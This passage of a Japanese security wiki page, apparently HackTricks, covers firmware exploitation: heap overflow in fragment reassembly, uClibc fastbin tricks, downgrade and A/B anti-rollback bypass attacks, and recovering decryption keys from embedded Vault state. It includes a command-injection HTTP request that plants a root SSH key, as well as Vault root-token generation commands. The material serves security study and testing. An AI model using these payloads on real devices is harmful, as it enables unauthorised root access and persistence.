1. **最初のfragment**（`offset == 0`）で`ctx->total_size`を保存し、`malloc(total_size)`でメモリを確保します。
2. 後続のfragmentでは、`packet_total_size >= offset + chunk_len`のような、攻撃者が制御する**packet-local**フィールドのみを検証します。
3. コピー処理では、**最初に確保したサイズ**を超えないか確認せずに`memcpy(&ctx->buffer[offset], chunk, chunk_len)`を実行します。

攻撃者は次のことができます。

- 宣言する合計サイズを**小さく**した有効な最初のfragmentを送り、小さなheap allocationを発生させる。
- **想定されるoffset**を保ちつつ、より大きな`chunk_len`を指定した後続fragmentを送る。
- 新たなチェックを通過しながら、最初に確保したbufferをoverflowさせる、偽装したpacket-local sizeを指定する。

脆弱な経路がcommissioningロジックの背後にある場合、malformed fragmentを送る前に、対象を想定されるmodel-downloadまたはblob-download状態へ移行させるための十分な**device emulation**が必要です。

### Protocol-driven `free()` triggers

組み込みデーモンでheap metadata exploitationを引き起こす最も簡単な方法は、「cleanupを待つ」ことではなく、**protocol自身のerror handlingを強制する**ことです。<sup>[[8]](#references)</sup>

- 不正な後続fragmentを送り、FSMを**retry**または**error** stateに移行させます。
- retry thresholdを超過させ、デーモンに**contextをリセット**させて破損したbufferを解放させます。
- プロセスが別の原因でクラッシュする前に、この予測可能な`free()`を使ってallocator側のprimitiveを実行します。

これは特に、組み込みLinuxの**musl/uClibc/dlmalloc系**allocatorに有効です。chunk metadataを破損させることで、unlink/unbinロジックをwrite primitiveに変えられる可能性があります。安定したパターンは、実際のbin pointerをすぐに上書きしてプロセスをクラッシュさせるのではなく、**size field**を破損させ、overflowしたbuffer内に配置した**fake chunk**へallocatorの走査を誘導することです。

## Binary Exploitation and Proof-of-Concept

特定した脆弱性のPoCを開発するには、対象アーキテクチャを深く理解し、低レベル言語でプログラミングする必要があります。組み込みシステムではbinary runtime protectionはまれですが、存在する場合はReturn Oriented Programming (ROP)などの手法が必要になることがあります。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibcはglibcと同様のfastbinを使用します。後続の大きなallocationで`__malloc_consolidate()`が呼び出される可能性があるため、fake chunkはチェックを通過できなければなりません（妥当なsize、`fd = 0`、周辺のchunkが「使用中」と認識されること）。<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ASLRが有効でも、メインバイナリが**non-PIE**なら、バイナリ内の`.data/.bss`アドレスは安定しています。有効なheap chunk headerに見える領域を狙うことで、fastbin allocationを**function pointer table**に配置できます。
- **Parser-stopping NUL:** JSONの解析時にpayload内の`\x00`を使うと、末尾の攻撃者制御可能なbytesをstack pivot/ROP chain用に残したまま、解析を停止できます。
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`、`lseek()`、`write()`を呼び出すROP chainで、既知のmappingに実行可能なshellcodeを配置して、そこへジャンプできます。

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos)や[EmbedOS](https://github.com/scriptingxss/EmbedOS)のようなOSは、ファームウェアのセキュリティテストに必要なツールを備えた、事前設定済みの環境を提供します。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOSは、Internet of Things (IoT)デバイスのセキュリティ評価とpenetration testingを支援するためのディストリビューションです。必要なツールをすべて読み込んだ事前設定済みの環境を提供するため、大幅に時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ファームウェアのセキュリティテスト用ツールをプリロードした、Ubuntu 18.04ベースの組み込みセキュリティテスト用OSです。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

ベンダーがファームウェアイメージの暗号署名チェックを実装していても、**version rollback（downgrade）protectionが省略されていることはよくあります**。bootloaderまたはrecovery loaderが埋め込み公開鍵で署名を検証するだけで、書き込むイメージの*version*（または単調増加カウンター）を比較しない場合、攻撃者は**有効な署名が付いた古い脆弱なファームウェア**を正規の手順でインストールし、修正済みの脆弱性を再び利用可能にできます。<sup>[[4]](#references)</sup>

典型的な攻撃ワークフロー:

1. **古い署名付きイメージを入手する**
   * ベンダーの公開ダウンロードポータル、CDN、またはサポートサイトから取得します。
   * 関連するモバイル/デスクトップアプリケーションから抽出します（例: Android APK内の`assets/firmware/`）。
   * VirusTotal、Internet Archive、フォーラムなどのサードパーティリポジトリから取得します。
2. 公開されている更新経路を使って、デバイスにイメージを**アップロードまたは配信する**:
   * Web UI、モバイルアプリAPI、USB、TFTP、MQTTなど。
   * 多くのコンシューマー向けIoTデバイスには、Base64でエンコードされたファームウェアblobを受け入れ、サーバー側でデコードしてrecovery/upgradeを開始する、*認証不要*のHTTP(S) endpointがあります。
3. downgrade後、新しいリリースで修正された脆弱性を悪用します（例: 後のリリースで追加されたcommand-injection filter）。
4. 必要に応じて、永続化を獲得した後に検知を避けるため、最新イメージを書き戻すか、更新を無効にします。

### 例: Downgrade後のCommand Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

脆弱な（ダウングレードされた）firmwareでは、`md5`パラメータがサニタイズされずにshell commandへ直接連結されるため、任意のコマンドを注入できます（ここでは、SSH keyベースのroot accessを有効化）。後のfirmwareバージョンでは基本的な文字フィルターが導入されましたが、ダウングレード保護がないため、この修正は無意味です。<sup>[[4]](#references)</sup>

### Mobile AppからのFirmwareの抽出

多くのベンダーは、Bluetooth/Wi-Fi経由でアプリからデバイスを更新できるよう、companion mobile applicationに完全なfirmware imageを同梱しています。これらのパッケージは、`assets/fw/`や`res/raw/`などのパスにあるAPK/APEX内に、暗号化されずに保存されていることが一般的です。`apktool`、`ghidra`、あるいは単純な`unzip`などのツールを使えば、物理ハードウェアに触れずに署名済みのimageを取り出せます。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot設計におけるupdater限定のanti-rollback bypass

一部のベンダーはanti-downgrade **ratchet**を実装していますが、それは*updater*のロジック内に限られます（例: CAN経由のUDS routine、recovery command、userspace OTA agent）。その後、**bootloader**がイメージの署名/CRCだけをチェックし、partition tableまたはslot metadataを信頼する場合、rollback protectionは依然としてbypassできます。<sup>[[7]](#references)</sup>

典型的な脆弱な設計:

- Firmware metadataにversion descriptorと**security ratchet** / monotonic counterの両方が含まれる。
- updaterはイメージのratchetをpersistent storageに保存された値と比較し、古い署名済みイメージを拒否する。
- **bootloader**はそのratchetを解析せず、選択されたslotを起動する前にheader、CRC、署名だけを検証する。
- Slot activationはpartition tableまたはslotごとのgeneration counterに別途保存され、検証済みの正確なfirmware digestに対して暗号学的にバインド**されていない**。

これにより、dual-slotシステムで**あるイメージを検証し、別のイメージを起動する**プリミティブが成立します。攻撃者が、最新の署名済みイメージを使ってupdaterにslot Bを次の起動先として設定させ、その後、再起動前にslot Bを上書きできる場合、bootloaderはすでにコミット済みのslot metadataだけを信頼するため、古いイメージを起動する可能性があります。

よくある悪用パターン:

1. **最新の署名済み**firmwareを非アクティブslotにアップロードし、通常の検証/切り替えroutineを実行して、そのslotが次のアクティブslotになるようlayoutを設定する。
2. **まだ再起動しない**。同じsession内でslot準備/erase routineを再度実行する。
3. 古いboot-stateまたは古いslot-selectionロジックを悪用し、updaterに、直前に昇格させた**同じ物理slot**をeraseさせる。
4. **古いが署名は有効な**firmwareをそのslotに書き込む。
5. ratchetを強制する検証routineをスキップし、直接再起動する。
6. bootloaderが昇格済みのslotを選択し、署名/整合性だけを検証して古いイメージを起動する。

A/B update実装をreverseするときに調べる点:

- slot selectionが、切り替え成功後に更新されない**起動時フラグ**から導出されている。
- `prepare_passive_slot()`のようなroutineが、**現在コミット済みのlayout**ではなく、古いstateに基づいてslotをeraseする。
- `part_write_layout()`のような関数が、**generation counter** / active flagだけを更新し、検証済みイメージのhashを保存しない。
- ratchetチェックがuserspaceまたはupdater codeに実装されているが、ROM / bootloader / secure boot stageには**実装されていない**。
- eraseまたはrecovery routineが、内容を削除して書き直した後もslotを起動可能な状態のままにする。

### Update Logicを評価するためのチェックリスト

* *update endpoint*のtransport/authenticationは適切に保護されているか（TLS + authentication）?
* deviceはflashする前に**version number**または**monotonic anti-rollback counter**を比較するか?
* イメージはsecure boot chain内で検証されるか（例: ROM codeが署名をチェックする）?
* **bootloader**は署名/CRCだけをチェックするのではなく、updaterと同じratchetを強制するか?
* Slot activation metadataは**検証済みfirmware digest/versionにバインド**されているか、それとも昇格後にslotを変更できるか?
* slot切り替えの成功後、deviceは強制的に再起動するか。それとも同じsession内で後続のupdate/erase routineにアクセスできるか?
* userland codeは追加のsanity check（例: 許可されたpartition map、model number）を行うか?
* *partial*または*backup* update flowは、同じ検証ロジックを再利用しているか?

> 💡  上記に欠けている項目があれば、そのplatformはおそらくrollback attackに対して脆弱です。

## 練習用の脆弱なfirmware

firmwareの脆弱性を見つける練習には、以下の脆弱なfirmware projectを出発点として利用してください。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 組み込みKMS/Vault stateからfirmware decryption keyを復元する

update imageに少量のplaintext metadataと大容量の高エントロピーblobが混在している場合、brute-forceを行う前にcontainer triageを実施してください:<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使って、header、offset、行境界をdumpする。
- `Salted__`は通常、OpenSSL `enc` formatを示す。次の8 bytesがsaltで、残りのbytesがciphertext。
- `256` bytesちょうどにdecodeされるBase64 fieldは、ランダムなfirmware password/session keyをラップしたRSA-2048 ciphertextである可能性が高い。
- 同じfile内のdetached PGP materialは、多くの場合、真正性のみを保護する。機密性を保護する仕組みだと決めつけないこと。

静的なkey探索（`grep`、`strings`、PEM/PGP検索）で見つからない場合は、private keyの検索だけにとどまらず、**運用上のdecrypt path**をreverseしてください:

- updater / management binaryをdecompileし、暗号化blobを読み込む処理、unwrapを行うhelper/API、その処理が要求するlogical key nameを追跡する。
- 抽出したroot filesystemから、unit fileやinit scriptとともにKMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）を検索する。
- plaintextの`vault operator unseal ...`、recovery key、bootstrap token、またはローカルKMS auto-unseal scriptは、private-key materialと同等に扱う。

機器に元のVault binaryとstorage backendが含まれている場合、Vault内部を再実装するよりも、その環境を再現する方が通常は簡単です:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

クローンした KMS で root 権限を取得した状態で:

- transit keys をエクスポート可能にする。ただし、隔離されたクローン内に限る: `vault write transit/keys/<name>/config exportable=true`
- unwrap key をエクスポートする: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS で使われている正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 での復号失敗や、デフォルトの OAEP での復号失敗は、key が間違っている証拠には**なりません**。Vault を使うフローの多くは SHA-256 を使った OAEP を使用しますが、一般的なライブラリのデフォルトは SHA-1 です。
- ペイロードが `Salted__` で始まる場合は、AES-CBC で復号する前に、ベンダーの OpenSSL KDF（`EVP_BytesToKey`。レガシー機器では多くの場合 MD5）を正確に再現します。

これにより、「暗号化された firmware」の解析は、より一般的な問題になります。**機器側で使われる運用 key を復元し、unwrap と KDF のパラメーターを正確に再現してオフラインで処理することです。**

## トレーニングと認定資格

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude による firmware の解析: シニアレベルのスキル、ジュニアレベルの自律性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing の手法](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: IoT 攻撃の決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放置されたハードウェアのゼロデイを悪用する – Trail of Bits のブログ](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 ドルのスマートデバイスから、あなたの自宅へのアクセスを得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector の充電ポートコネクターからの悪用 - Part 2: アンチダウングレードの回避](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge の over-the-air 悪用](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU 上で Tesla OS の root を取得する Part 1: unpacking](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel のドキュメント - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU 上で Tesla OS の root を取得する Part 2: debugging と修正](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Passwords: 弱い XOR 暗号化により SPI Flash から復元可能 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password の復元ツール](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
